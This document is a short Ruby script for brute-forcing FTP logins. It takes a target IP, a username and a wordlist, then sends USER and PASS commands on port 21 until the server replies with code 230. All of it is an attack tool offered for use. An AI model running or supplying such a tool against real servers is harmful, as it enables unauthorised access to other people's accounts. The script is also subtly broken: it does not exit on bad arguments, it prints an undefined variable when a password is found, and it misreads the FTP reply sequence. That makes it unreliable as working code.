require 'socket'
require 'timeout'


$target_ip = ARGV[0]
$user      = ARGV[1]
$wordlist  = ARGV[2]


unless ARGV.length == 3
	puts "[!] Usage: ruby bruteftp.rb <target> <user> <wordlist>"
end


def try_connect()
	print "[+] Trying connection..."
	begin
		s        = Socket.new Socket::AF_INET, Socket::SOCK_STREAM
		sockaddr = Socket.pack_sockaddr_in( 21, $target_ip)
		@result = s.connect(sockaddr)
		s.close

		if @result == 0
			puts "[OK]"
		else
			raise "[!] Connection error"
		end 
	rescue
		puts "[!] Error =("
		exit
	end
end


def read_wordlist(list)
	print "[+] Reading wordlist..."
	begin
		file = File.open(list, 'r')
		$check = file.read.chomp.split("\n")
		file.close
		puts "[OK]"
	rescue
		puts "[!] Fail to read wordlist"
		exit
	end
end


def brute(pass)
	begin
		s = TCPSocket.new($target_ip, 21)
		s.gets
		s.puts("USER #{$user}")
		s.puts("PASS #{pass}")
		response = s.gets
		s.close
		return false unless response.include? '230'
		return true
	rescue
		return false
	end
end

try_connect()
read_wordlist($wordlist)

puts "================================="
puts "[+] Target ==> #{$target_ip}"
puts "[+] User   ==> #{$user}"


$check.each do |pass|
	if brute(pass)
		puts "[-] Password found!"
		puts "[-] User: #{user}"
		puts "[-] Pass: #{pass}"
		break
	end
end
